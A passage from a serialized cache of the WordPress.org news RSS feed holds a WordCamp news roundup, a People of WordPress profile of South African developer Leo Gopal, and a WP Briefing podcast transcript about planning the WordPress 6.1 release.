opportunities.</p></blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>WordCamp Asia 2023 is Calling for Sponsors</h2>\n\n\n\n<ul><li>WordCamp Asia 2023, the first flagship WordCamp event in Asia, recently opened its <a href=\"https://asia.wordcamp.org/2023/call-for-sponsors/\">Call for Sponsors</a>.</li><li><a href=\"https://us.wordcamp.org/2022/\">WordCamp US 2022</a> is sold out. General Admission tickets went on sale on June 30, 2022, and were quickly claimed the same day. If you couldn’t get yours, the organizing team recommends <a href=\"https://us.wordcamp.org/2022/tickets/\">checking this page</a> periodically to see if any become available.</li><li>Curious about why WordCamp US is hosting fewer people this year? The WordCamp US team explained why in <a href=\"https://us.wordcamp.org/2022/wordcamp-us-2022-and-attendee-count/\">this post</a>.</li><li><a href=\"https://europe.wordcamp.org/2022/\">WordCamp Europe 2022</a> was successfully held in Porto, Portugal, from June 2 to 4, 2022. The event saw 2,300 in-person attendees and a record 800 participants at Contributor Day. All the sessions will be available <a href=\"https://wordpress.tv/event/wordcamp-europe-2022/\">on WordPress.tv soon</a>.</li><li>In 2023, WordCamp Europe will be hosted in the city of Athens, Greece. The <a href=\"https://europe.wordcamp.org/2023/call-for-organisers/\">Call for Organizers</a> is now open.</li><li>Josepha Haden covered some important questions from WordCamp Europe on a <a href=\"https://wordpress.org/news/2022/06/episode-33-some-important-questions-from-wceu/\">special episode of WP Briefing</a>. Be sure to give it a listen!</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\"><p>The #WPDiversity group has organized a free, online speaker workshop for Indian women in the WordPress community. The event will take place on September 24-25, 2022. <a href=\"https://www.eventbrite.com/e/speaker-workshop-for-indian-women-in-the-wordpress-community-sept-24-25-tickets-348466712317\">Registration is now open</a>.</p></blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<p><strong><em><strong><em>Have a story that we could include in the next issue of The Month in WordPress? Let us know by filling out </em></strong><a href=\"https://make.wordpress.org/community/month-in-wordpress-submissions/\"><strong><em>this form</em></strong></a><strong><em>.</em></strong></em></strong></p>\n\n\n\n<p><em>The following folks contributed to this Month in WordPress: <a href=\'https://profiles.wordpress.org/mysweetcate/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>mysweetcate</a>, <a href=\'https://profiles.wordpress.org/dansoschin/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>dansoschin</a>, <a href=\'https://profiles.wordpress.org/lmurillom/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>lmurillom</a>, <a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>, <a href=\'https://profiles.wordpress.org/chaion07/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chaion07</a>, <a href=\'https://profiles.wordpress.org/rmartinezduque/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>rmartinezduque</a>.</em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13069\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:24;a:6:{s:4:\"data\";s:72:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:30:\"People of WordPress: Leo Gopal\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:65:\"https://wordpress.org/news/2022/06/people-of-wordpress-leo-gopal/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Thu, 30 Jun 2022 12:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:6:{i:0;a:5:{s:4:\"data\";s:9:\"Community\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Features\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:7:\"General\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:10:\"Interviews\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:9:\"HeroPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:5;a:5:{s:4:\"data\";s:19:\"People of WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13020\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:355:\"In this series, we share some of the inspiring stories of how WordPress and its global network of contributors can change people&#8217;s lives for the better. This month we feature Leo Gopal, from South Africa, a back-end Developer and Customer Support agent on the encouragement and learning support the WordPress community can give. Writing as [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:10:\"Meher Bala\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:11765:\"\n<p>In this series, we share some of the inspiring stories of how WordPress and its global network of contributors can change people&#8217;s lives for the better. This month we feature Leo Gopal, from South Africa, a back-end Developer and Customer Support agent on the encouragement and learning support the WordPress community can give.</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img decoding=\"async\" loading=\"lazy\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/06/featured-img-for-leo2.jpg?resize=680%2C420&#038;ssl=1\" alt=\"Portrait of Leo Gopal in a black shirt with a blue sky behind.\" class=\"wp-image-13037\" width=\"680\" height=\"420\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/06/featured-img-for-leo2.jpg?w=1014&amp;ssl=1 1014w, https://i0.wp.com/wordpress.org/news/files/2022/06/featured-img-for-leo2.jpg?resize=300%2C186&amp;ssl=1 300w, https://i0.wp.com/wordpress.org/news/files/2022/06/featured-img-for-leo2.jpg?resize=768%2C475&amp;ssl=1 768w\" sizes=\"(max-width: 680px) 100vw, 680px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<h2>Writing as a channel of expression</h2>\n\n\n\n<p>Curiosity, writing, and resilience are recurring themes in Leo&#8217;s story, and have mapped with his WordPress journey.&nbsp;</p>\n\n\n\n<p>High school was a difficult time for Leo, as he had a speech impediment which only subsided when he was with close friends or family.</p>\n\n\n\n<p>He began writing a journal as an avenue of expression and found every word arrived smoothly for him. &nbsp;</p>\n\n\n\n<h2>It all began with WordPress 1.2 &#8216;Mingus&#8217;</h2>\n\n\n\n<p>In 2004, Leo discovered the joy of blogging as a way of combining keeping a journal with ‘conversations’ he could have with those who commented on his blogs. The potential and power of blogs would be an influence in the rest of his life.</p>\n\n\n\n<figure class=\"wp-block-image aligncenter size-full is-resized\"><img decoding=\"async\" loading=\"lazy\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/06/leo-gopal.jpeg?fit=720%2C960&amp;ssl=1\" alt=\"Leo sat in front of a pond. \" class=\"wp-image-13027\" width=\"720\" height=\"960\" srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/06/leo-gopal.jpeg?w=720&amp;ssl=1 720w, https://i1.wp.com/wordpress.org/news/files/2022/06/leo-gopal.jpeg?resize=225%2C300&amp;ssl=1 225w\" sizes=\"(max-width: 720px) 100vw, 720px\" /></figure>\n\n\n\n<p>As Leo&#8217;s confidence grew through expressing himself in writing, he was determined that his stutter would &#8216;no longer hold power over him&#8217;. In 2005, with the encouragement of his blog readers, he spent his school summer break in his room working on reducing his stutter. WordPress would be the tool that would enable him to connect with his blog readers and to express his creativity and thoughts.</p>\n\n\n\n<h2>Making WordPress your own</h2>\n\n\n\n<p>In high school, Leo had opted for programming as one of his subjects. In 2008, he built his first website using WordPress for the students at the school. This was the first time he saw the real value of WordPress and open source.</p>\n\n\n\n<p>During the following years, he increasingly spent time searching online for information on &#8216;Customising WordPress&#8217; and &#8216;Making WordPress your own&#8217;.</p>\n\n\n\n<p>Leo wanted to keep busy and as soon as he finished school, he applied for every entry-level web-related job that he could find. He was hired by a company for the role of webmaster for its Marketing team focused on WordPress.</p>\n\n\n\n<p>He continued to grow his skills as a WordPress developer with the help of useful documentation that he could find and through his helpful local WordPress Community. This helped him earn a living and support his family.</p>\n\n\n\n<h2>Helping yourself through helping others in the community</h2>\n\n\n\n<p>In 2015, Leo moved full-time to Cape Town, South Africa, and started as a developer at a web development agency, eventually progressing to its Head of Development and managing a small team.</p>\n\n\n\n<p>He chose WordPress as his main platform for development mainly because of the community behind it.</p>\n\n\n\n<blockquote class=\"wp-block-quote\"><p>“<em>Had it not been for those searches on how to make WordPress your own, my life would have turned out a lot differently</em>.”&nbsp;</p><cite>Leo Gopal</cite></blockquote>\n\n\n\n<p>Leo felt he had a hurdle to overcome working in web sector. He didn’t feel like a ‘real developer’ being self-taught. However, through the community, he realized that there were many self-taught developers and he was not alone.&nbsp;&nbsp;</p>\n\n\n\n<p>Alongside his development path, Leo faced a mental health journey. He had suffered from depression and found the community to be accepting and understanding of this.&nbsp;</p>\n\n\n\n<p>At WordCamp Cape Town 2016, he stood in front of an audience and gave a talk: “<a href=\"https://wordpress.tv/2016/11/24/leo-gopal-the-wordpress-community-mental-wellness-and-you/\">The WordPress Community, Mental Wellness, and You</a>”. Following this talk, he was greeted by many attendees who thanked him for talking so openly about mental health issues.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"683\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-2.jpeg?resize=1024%2C683&#038;ssl=1\" alt=\"Leo speaking at the podium at WordCamp Cape Town in 2016\" class=\"wp-image-13023\" srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-2.jpeg?w=1024&amp;ssl=1 1024w, https://i1.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-2.jpeg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-2.jpeg?resize=768%2C512&amp;ssl=1 768w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>Leo speaking at a WordCamp</em> Cape Town, 2016</figcaption></figure>\n\n\n\n<p>Leo has been diagnosed with bipolar, previously known as manic depression. In 2017, he hit a low period and struggled to keep going. He found support and understanding in the community in WordPress.</p>\n\n\n\n<p>He has openly written about his experiences with depression and started an initiative where topics of mental health and general wellbeing can be freely and non-judgmentally discussed.&nbsp;&nbsp;</p>\n\n\n\n<p>He said that by helping others, he is helping himself, every day.</p>\n\n\n\n<h2>Contributing to WordPress</h2>\n\n\n\n<p>Leo has contributed to the community as a Co-organizer in South Africa for the 2016 and 2017 WordCamp Cape Town, WordPress Meetup Cape Town 2015 &#8211; 2016, and WordPress Durban 2017 – 2020. He has also spoken at a number of WordCamps.</p>\n\n\n\n<p>Maintaining connections with people he had met through these events Leo felt was a great aid to his mental wellbeing during the Covid pandemic. </p>\n\n\n\n<p>He has contributed to core and plugins and believes that WordPress and its community make it extremely easy to contribute. </p>\n\n\n\n<blockquote class=\"wp-block-quote\"><p>“<em>The cost to start contributing is extremely low &#8211; start now</em>”.</p><cite>Leo Gopal</cite></blockquote>\n\n\n\n<p>When the ability to create and add patterns to the WordPress.org library came out in 2021, Leo used it almost immediately and created a <a href=\"https://wordpress.org/patterns/pattern/call-to-action-section-2/\">call-to-action box</a> which could be used by both his clients and the community. He plans to release a few more complex patterns.&nbsp;&nbsp;</p>\n\n\n\n<h2>Yes, we can.</h2>\n\n\n\n<p>Leo’s mantra is “I can do it!”</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"683\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-3.jpeg?resize=1024%2C683&#038;ssl=1\" alt=\"Leo speaking at a WordCamp Cape Town in 2019\" class=\"wp-image-13032\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-3.jpeg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-3.jpeg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-3.jpeg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-3.jpeg?resize=1536%2C1024&amp;ssl=1 1536w, https://i0.wp.com/wordpress.org/news/files/2022/06/Leo-speaking-3.jpeg?w=1944&amp;ssl=1 1944w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>Leo speaking at a WordCamp</em> Cape Town, 2019</figcaption></figure>\n\n\n\n<p>Getting over a stutter, overcoming poverty, being urgently self-taught, growing up in a country with “load shedding” electricity outages, and one of the slowest rated internet speeds in the developing world, and strengthening mental wellness are not easy feats., And yet, he knows he can do it.</p>\n\n\n\n<blockquote class=\"wp-block-quote\"><p>“<em>Never, ever think you do not have the &#8216;right&#8217; circumstances for success. Just keep going, progress over perfection – <strong>you</strong> can do it</em>.”</p><cite>Leo Gopal</cite></blockquote>\n\n\n\n<p>As Leo puts it, the WordPress community doesn’t just power a percentage of the internet; it empowers too.</p>\n\n\n\n<h2>Share the stories</h2>\n\n\n\n<p>Help share these stories of open source contributors and continue to grow the community. Meet more WordPressers in the <a href=\"https://wordpress.org/news/category/newsletter/interviews/\">People of WordPress series</a>.</p>\n\n\n\n<h2>Contributors</h2>\n\n\n\n<p>Thanks to Nalini Thakor (<a href=\'https://profiles.wordpress.org/nalininonstopnewsuk/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>nalininonstopnewsuk</a>), Larissa Murillo (<a href=\'https://profiles.wordpress.org/lmurillom/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>lmurillom</a>), Meher Bala (<a href=\'https://profiles.wordpress.org/meher/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>meher</a>), Abha Thakor (<a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>), Chloe Bringmann (<a href=\'https://profiles.wordpress.org/cbringmann/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>cbringmann</a>) for work on this feature, and to all the contributors who helped with specific areas and the series this last few months. Thank you too to Leo Gopal (<a href=\'https://profiles.wordpress.org/leogopal/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>leogopal</a>) for sharing his experiences.</p>\n\n\n\n<p>Thank you to Josepha Haden (<a href=\'https://profiles.wordpress.org/chanthaboune/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chanthaboune</a>) and Topher DeRosia (<a href=\'https://profiles.wordpress.org/topher1kenobe/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>topher1kenobe</a>) for support of the People of WordPress series.</p>\n\n\n\n<div class=\"wp-block-media-text is-stacked-on-mobile is-vertically-aligned-center\" style=\"grid-template-columns:29% auto\"><figure class=\"wp-block-media-text__media\"><img decoding=\"async\" loading=\"lazy\" width=\"180\" height=\"135\" src=\"https://i1.wp.com/wordpress.org/news/files/2020/03/heropress_logo_180.png?resize=180%2C135&#038;ssl=1\" alt=\"HeroPress logo\" class=\"wp-image-8409 size-full\" data-recalc-dims=\"1\" /></figure><div class=\"wp-block-media-text__content\">\n<p class=\"has-small-font-size\"><em>This People of WordPress feature is inspired by an essay originally published on </em><a href=\"https://heropress.com/\"><em>HeroPress.com</em></a><em>, a community initiative created by Topher DeRosia. It highlights people in the WordPress community who have overcome barriers and whose stories might otherwise go unheard. </em>#HeroPress </p>\n</div></div>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13020\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:25;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:49:\"WP Briefing: Episode 34: WordPress 6.1 is Coming!\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:70:\"https://wordpress.org/news/2022/06/episode-34-wordpress-6-1-is-coming/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 27 Jun 2022 15:13:42 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13013\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:154:\"Join WordPress Executive Director Josepha Haden Chomphosy as she covers planning for major releases and how you can get involved in the 6.1 release cycle!\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/06/WP-Briefing-034.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:8675:\"\n<p>In the thirty-fourth episode of the WordPress Briefing, hear WordPress Executive Director Josepha Haden Chomphosy discuss planning for the major release and how you can get involved in the WordPress 6.1 release cycle! </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<ul><li>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a></li><li>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/beafialho/\">Beatriz Fialho</a></li><li>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a></li><li>Song: Fearless First by Kevin MacLeod</li></ul>\n\n\n\n<h2>References</h2>\n\n\n\n<ul><li><a href=\"https://make.wordpress.org/core/2022/06/23/wordpress-6-1-planning-roundup/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/core/2022/06/23/wordpress-6-1-planning-roundup/\">WordPress 6.1 Planning Roundup Core Post</a></li><li><a href=\"https://make.wordpress.org/core/tag/6-1/\">All WordPress 6.1 posts on Make Core</a></li><li><a href=\"https://www.eventbrite.com/e/speaker-workshop-for-indian-women-in-the-wordpress-community-sept-24-25-tickets-348466712317\">Speaker Workshop for Indian Women in the WordPress Community</a></li><li><a href=\"https://wordpress.org/photos/\" data-type=\"URL\" data-id=\"https://wordpress.org/photos/\">Submit photos to the WordPress Photo Directory</a></li></ul>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13013\"></span>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:00:10]&nbsp;&nbsp;</p>\n\n\n\n<p>Hello everyone. And welcome to the WordPress Briefing, the podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it, as well as get a small list of big things coming up in the next two weeks. I&#8217;m your host Josepha Haden Chomphosy.</p>\n\n\n\n<p>Here we go.</p>\n\n\n\n<p>All right my friends. So it&#8217;s been about a month since WordPress 6.0 came out and you know what that means. It means we are already looking at the next major WordPress release because,&nbsp; as most of you know, WordPress never sleeps. Y&#8217;all are honestly up and hustling like 24/7 as far as I can tell, which is great! And is one of the many benefits of being a global community, I suppose.&nbsp;</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:01:05]</p>\n\n\n\n<p>But anyway, back to this major release. There was a high-level roadmap shared by Mattias Ventura at the start of June. And it lists some focus areas for the Block Editor, continued refinements to the template editor and navigation block, and some work on global styles and more / better blocks and design tools that are slated to ship with WordPress 6.1. From the WordPress core side, though, there are a couple hundred tickets that are milestoned for the next major.</p>\n\n\n\n<p>Being milestoned for a release means that either a ticket wasn&#8217;t ready for the last release and was moved to the next available one, or a ticket has become ready for a release since the last major release occurred. That list as it stands might be a little bit too big for a single release. However, honestly, no list is too big if we have enough folks contributing.<br></p>\n\n\n\n<p>So if you&#8217;ve never contributed to a major release of WordPress before, and you&#8217;re interested to know how that works, there are some things to keep an eye out for over the next few weeks. We are in what is considered the planning phase for the next big release. And so there are two or three things you&#8217;re gonna see pretty soon.</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:02:11]&nbsp;</p>\n\n\n\n<p>First is a planning kickoff post. That post gets published on make.wordpress.org/core, and it includes notes on volunteering for the release squad, some guesses at areas of focus based on the tickets that we&#8217;re seeing in track, a schedule, the whole kit, and caboodle. It&#8217;s all in there. If you are wanting to know how to lend a hand and how to take your first steps to core contribution, apart from the new contributor meeting that happens before the dev chat, that post is the place to start.&nbsp;</p>\n\n\n\n<p>So keep an eye out on make.wordpress.org/core for that. And then the second thing that shows up in the planning phase for any major release is bug scrub and ticket triage meetings. Like I mentioned, there are the new contributor meetings where they scrub tickets and talk through the basics of what we&#8217;re seeing on good first bugs.</p>\n\n\n\n<p>And I mentioned that here often, I just mentioned it in the last, in the last bullet point, but there are also regular bug scrubs and ticket triaging sessions where a kind contributor chooses a set of tickets to review and then leads other contributors through the process of checking to see if a ticket is valid to see if it can be replicated to see if it has a patch.</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:03:23]&nbsp;</p>\n\n\n\n<p>If there are decisions that are blocking it and how to move those decisions forward, and generally just kind of discuss what else has to be done in order to take the ticket to the next step. Those get announced in the dev chat every Wednesday, but also there is a post that will go up on make.wordpress.org/core.</p>\n\n\n\n<p>I wish I had a faster way to say that instead of just racing through the whole URL every time. But it&#8217;ll be okay. We&#8217;ll put it in the show notes in case you would rather just click some stuff. And the third thing to keep an eye out for. If development is not your thing, so writing code is not already part of your tool belt, that&#8217;s totally fine. There are many other important areas where you can contribute, too. Design, training, support, polyglots, marketing, documentation, and more. These teams all do work in and around a release that is vital to WordPress&#8217; overall success.&nbsp;</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:04:19]&nbsp;</p>\n\n\n\n<p>And a final thought of all. If that felt a little too intense if you want to see where this ship is headed, but you can&#8217;t quite commit to grabbing an oar today, that&#8217;s fine, too. The most important thing is that if you are a member of the community, as an extender or a user or a die-hard contributor, or a new contributor, the most important thing is that you have some general awareness of what the overall direction is.&nbsp;</p>\n\n\n\n<p>You might do that by experimenting with blocks in your products or by testing screen readers against your workflow or even by setting aside an hour to participate in the latest testing prompt. Being aware of what&#8217;s happening in and around your area of the project will help to keep you kind of prepared and knowledgeable to lend a hand whenever it is that you are ready.</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:05:14]&nbsp;</p>\n\n\n\n<p>And that then brings us to our small list of big things. My friends, registration is now open for the WordPress Speaker Workshop for Women Voices in India. That&#8217;s taking place on September 24th and 25th. Uh, it&#8217;s happening over Zoom, so location or travel shouldn&#8217;t really be an obstacle for you. I&#8217;m going to leave a link to some information about that in the show notes. It should be an excellent opportunity that [the] WP Diversity initiative that WordPress has, that the community team helps to foster, is really an excellent experience. And so I hope that you register and attend that.&nbsp;</p>\n\n\n\n<p>And the second thing actually is a bit of a celebration. The Photo Directory recently hit a huge milestone of 3000 photos! And you also can submit your photos to wordpress.org/photos. If you feel so inclined to make a contribution of that type.&nbsp;</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:06:07]&nbsp;</p>\n\n\n\n<p>And then the third thing on my smallest of big things is actually kind of a, a WordPress tooltip a little bit of a WordPress project did-ya-know? So, there is a special channel in WordPress Slack for sharing thanks to folks who were especially helpful to you. It&#8217;s called the Props Channel. And when someone shares props with you, it even shows up in your activity on your wordpress.org profile. Pretty cool, huh? Props to the Meta team for that one.</p>\n\n\n\n<p>And that my friends is your small list of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And I&#8217;ll see you again in a couple of weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13013\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:26;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:59:\"WP Briefing: Episode 33: Some Important Questions from 